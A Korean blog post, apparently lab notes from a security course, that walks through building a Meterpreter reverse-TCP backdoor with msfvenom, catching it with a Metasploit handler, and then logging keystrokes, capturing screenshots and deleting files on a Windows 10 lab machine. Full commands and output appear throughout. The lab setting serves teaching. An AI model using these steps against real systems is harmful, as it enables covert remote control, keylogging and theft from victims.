# Cloud DX - 48 MSF를 이용한 Backdoor 해킹

- 📅 Published: Mon, 24 Nov 2025 09:27:03 GMT
- 🔗 [Read on Velog](https://velog.io/@kyk02405/Cloud-DX-48-MSF%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-Backdoor-%ED%95%B4%ED%82%B9)

<hr />
<h1 id="span-style--colorskyblue11-msf를-이용한-backdoor-해킹span"><span style="color: skyblue;">11. MSF를 이용한 Backdoor 해킹</span></h1>
<h2 id="111-개요">11.1 개요</h2>
<ul>
<li><code>msfvenom</code> (Meta Sploit Framework(작업환경) <code>[Virtualization Environment Negleted Operations Manipulation]</code>)</li>
<li><code>메타 스플로잇 프레임워크</code>의 가상환경을 무시하는 <code>운영 속임수</code>를 말한다.</li>
<li>해킹도구를 사용하는 작업환경에서 가상 환경으로 작업할 수 있도록 하는 전체적인 작업 형태를 말한다.</li>
<li><code>Meta Sploit Payload</code> 생성기를 이용해서 생성한다. </li>
<li>메타 스플로잇 프레임워크의 가상환경을 무시하는 운영 속임수에 필요한 데이터를 생성하는 것</li>
<li>(핵심) 해커가 실제 공격 대상이 되는 PC에 전송하려는 데이터(악성코드) 또는 침투 성공 후 본격적으로 수행할 일들의 총칭<h2 id="112-악성코드-생성">11.2 악성코드 생성</h2>
<blockquote>
<h3 id="실습환경-nat">실습환경 (NAT)</h3>
</blockquote>
</li>
<li><code>Kali</code><ul>
<li><code>192.168.10.130</code> / <code>C Class</code> / <code>192.168.10.2</code> / <code>192.168.10.2</code></li>
</ul>
</li>
<li><code>Windows 10</code><ul>
<li><code>192.168.10.131</code> / <code>C Class</code> / <code>192.168.10.2</code> / <code>192.168.10.2</code></li>
</ul>
</li>
</ul>
<h3 id="사용법">사용법</h3>
<ul>
<li>명령어 <code>Example</code> 확인<pre><code class="language-bash">sudo msfvenom -l
...
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</code></pre>
</li>
<li>명령어 해석
```bash
/usr/bin/msfvenom #: 명령어</li>
<li>p #: 페이로드(Payload, 탑재) 옵션 windows/meterpreter/reverse_tcp #: 페이로드(유효 탑재량)
LHOST=192.168.10.130 #: 공격자의 IP
(옵션)LPORT=8013 #: 공격자 포트 번호(임의의 포트 지정)</li>
<li>f exe #: 악성코드 파일 유형(실행파일, Excute)</li>
<li>o /home/samadal/madal.exe #: 백도어 파일 저장 경로 및 파일명(-o 생략가능)<pre><code></code></pre></li>
</ul>
<h3 id="악성코드-생성">악성코드 생성</h3>
<ul>
<li>생성<pre><code class="language-bash">[samadal@kali ~]$ sudo /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.130 -f exe &gt; /home/samadal/madal.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 7168 bytes</code></pre>
</li>
<li>확인
<img alt="" src="https://velog.velcdn.com/images/kyk02405/post/394beab8-56a7-40a1-8f55-f3d9f3b1b6d5/image.png" /></li>
</ul>
<h3 id="악성코드-실행">악성코드 실행</h3>
<ul>
<li>페이로드 생성<pre><code class="language-bash">[samadal@kali ~]$ sudo msfconsole
Metasploit tip: The use command supports fuzzy searching to try and
select the intended module, e.g., use kerberos/get_ticket or use
kerberos forge silver ticket
</code></pre>
</li>
</ul>
<h1 id="cowsay">cowsay++</h1>
<hr />
<h2 id="metasploit">&lt; metasploit &gt;</h2>
<pre><code>   \   ,__,
    \  (oo)____
       (__)    )\
          ||--|| *


   =[ metasploit v6.4.97-dev                                ]</code></pre><ul>
<li>-- --=[ 2,570 exploits - 1,316 auxiliary - 1,680 payloads     ]</li>
<li>-- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]</li>
</ul>
<p>Metasploit Documentation: <a href="https://docs.metasploit.com/">https://docs.metasploit.com/</a>
The Metasploit Framework is a Rapid7 Open Source Project
msf &gt; use exploit/multi/handler
[<em>] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) &gt;
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.10.130
lhost =&gt; 192.168.10.130
msf exploit(multi/handler) &gt; set ExitOnSession false
ExitOnSession =&gt; false
msf exploit(multi/handler) &gt; exploit -j -z
[</em>] Exploit running as background job 0.
[*] Exploit completed, but no session was created.</p>
<p>[*] Started reverse TCP handler on 192.168.10.130:4444
msf exploit(multi/handler) &gt; sessions -l</p>
<h1 id="active-sessions">Active sessions</h1>
<p>No active sessions.</p>
<pre><code>&gt; `No active sessions.` : 공격 대상 시스템에서 악성코드를 먼저 실행해야 한다.

---

### 페이로드 실행 1.
- 작업
  - 방화벽 중지 또는 해제 ![](https://velog.velcdn.com/images/kyk02405/post/d58819d6-ff5a-4b33-aa99-333cf9c3c93b/image.png)
  - `Windows 10`에서 `Kali`로 접속해서 백도어 실행파일을 다운로드 후 실행한다. ![](https://velog.velcdn.com/images/kyk02405/post/21cdaea0-65d3-4586-a6cb-48f4c3e6f2da/image.png)
  - 메모리에 로딩되어 있는지 확인![](https://velog.velcdn.com/images/kyk02405/post/7a9198d5-a0a4-44a7-ac99-2e9850bbc388/image.png)




---
### 페이로드 실행 2. 포트추가(4444)
```bash
[samadal@kali ~]$ sudo ufw status
Status: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
20/tcp                     ALLOW       Anywhere
21/tcp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
22/tcp (v6)                ALLOW       Anywhere (v6)
20/tcp (v6)                ALLOW       Anywhere (v6)
21/tcp (v6)                ALLOW       Anywhere (v6)
80/tcp (v6)                ALLOW       Anywhere (v6)


[samadal@kali ~]$ sudo ufw allow 4444/tcp
Rule added
Rule added (v6)

[samadal@kali ~]$ sudo ufw reload
Firewall reloaded

[samadal@kali ~]$ sudo msfconsole
Metasploit tip: Enable verbose logging with set VERBOSE true

 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.4.97-dev                                ]
+ -- --=[ 2,570 exploits - 1,316 auxiliary - 1,683 payloads     ]
+ -- --=[ 433 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.10.130
lhost =&gt; 192.168.10.130
msf exploit(multi/handler) &gt; set ExitONSession false
ExitONSession =&gt; false
msf exploit(multi/handler) &gt; exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.10.130:4444
msf exploit(multi/handler) &gt; [*] Sending stage (188998 bytes) to 192.168.10.131
[*] Meterpreter session 1 opened (192.168.10.130:4444 -&gt; 192.168.10.131:64070) at 2025-11-24 17:54:26 +0900
msf exploit(multi/handler) &gt; sessions -l

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x86/windows  WIN1022H2\Administrator @ WIN1022H2  192.168.10.130:4444 -&gt; 192.168
</code></pre><ul>
<li><code>exploit -j -z</code>명령 전에 <code>Windows 10</code>에서 <code>madal.exe</code> 실행 후 명령 실행</li>
</ul>
<hr />
<h3 id="공격대상과의-동기화를-시동">공격대상과의 동기화를 시동</h3>
<pre><code class="language-bash">msf exploit(multi/handler) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt;
</code></pre>
<hr />
<h3 id="테스트">테스트</h3>
<ul>
<li>시스템 정보 확인 <img alt="" src="https://velog.velcdn.com/images/kyk02405/post/76872c52-114d-4951-af8b-8643cabf66da/image.png" /> <pre><code class="language-bash">meterpreter &gt; sysinfo
Computer        : WIN1022H2
OS              : Windows 10 22H2+ (10.0 Build 19045).
Architecture    : x64
System Language : ko_KR
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows</code></pre>
</li>
</ul>
<hr />
<ul>
<li><code>Key Scanning</code><ul>
<li>키보드 캡쳐링 (키보드로 입력하는 모든 것들을 캡쳐한다.)<pre><code class="language-bash">meterpreter &gt; keyscan_start
Starting the keystroke sniffer ...
meterpreter &gt; keyscan_dump
Dumping captured keystrokes...</code></pre>
</li>
</ul>
</li>
<li><img alt="" src="https://velog.velcdn.com/images/kyk02405/post/5535462f-a09a-4713-89f9-553b564b9cbc/image.png" /><pre><code class="language-bash">meterpreter &gt; keyscan_dump
Dumping captured keystrokes...
c&lt;^H&gt;d&lt;^H&gt;cls&lt;CR&gt;
dir&lt;CR&gt;
mkdir clouddir&lt;CR&gt;
dir&lt;CR&gt;</code></pre>
</li>
</ul>
<hr />
<ul>
<li><p>공격 대상 화면을 이미지로 저장</p>
<ul>
<li><p>이미지 캡쳐링</p>
</li>
<li><p>화면 출력 1. <code>scp 명령어</code>를 이용해서 윈도우에 다운로드 후 확인 <img alt="" src="https://velog.velcdn.com/images/kyk02405/post/440bc429-fbe8-4af3-aa91-7a9f3a2fe938/image.png" /></p>
</li>
<li><p>화면 출력 2. 웹 브라우저를 이용해서 공격자의 IP를 이용해서 파일을 확인 <img alt="" src="https://velog.velcdn.com/images/kyk02405/post/143cd4ed-6fff-412d-9e80-60b2923ae488/image.png" /></p>
<pre><code class="language-bash">[samadal@kali ~]$ sudo mv yTxUruxp.jpeg  /var/www/html
</code></pre>
</li>
</ul>
</li>
</ul>
<p>[samadal@kali ~]$ sudo service apache2 restart</p>
<pre><code>- `help` 사용 가능한 명령어 확인
```bash
meterpreter &gt; help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for 

...</code></pre><ul>
<li><p>파일 삭제하기 <img alt="" src="https://velog.velcdn.com/images/kyk02405/post/99818310-daed-4090-b063-685399aab9b6/image.png" /></p>
<pre><code class="language-bash">meterpreter &gt; cd c:
meterpreter &gt; del yTxUruxp.jpeg</code></pre>
</li>
<li><p><code>keyscan dump</code>(입력했던 명령어 확인)</p>
<pre><code class="language-bash">meterpreter &gt; keyscan_dump
Dumping captured keystrokes...
s&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;scp samadal&lt;Shift&gt;@1921.&lt;^H&gt;&lt;^H&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Down&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;Up&gt;&lt;CR&gt;
&lt;Up&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Right&gt;&lt;CR&gt;
&lt;CR&gt;
&lt;Up&gt;&lt;^V&gt;&lt;CR&gt;
&lt;^V&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Up&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Down&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Right&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;var/wwwhtml&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;&lt;^H&gt; .&lt;CR&gt;
1&lt;CR&gt;
dir&lt;CR&gt;
&lt;Up&gt;&lt;Up&gt;&lt;CR&gt;
1&lt;CR&gt;
s&lt;^H&gt;ls -l&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;dir&lt;CR&gt;
&lt;Up&gt;&lt;Down&gt;&lt;Up&gt;&lt;Up&gt;&lt;Down&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;Right&gt;&lt;^H&gt;home/&lt;^H&gt;samadal&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;/samadal&lt;CR&gt;
1&lt;CR&gt;
&lt;^A&gt;&lt;^V&gt;192.168.10.130/&lt;^V&gt;&lt;^H&gt;&lt;^V&gt;&lt;CR&gt;
&lt;^Shift&gt;&lt;^C&gt;&lt;F2&gt;&lt;^C&gt;</code></pre>
</li>
</ul>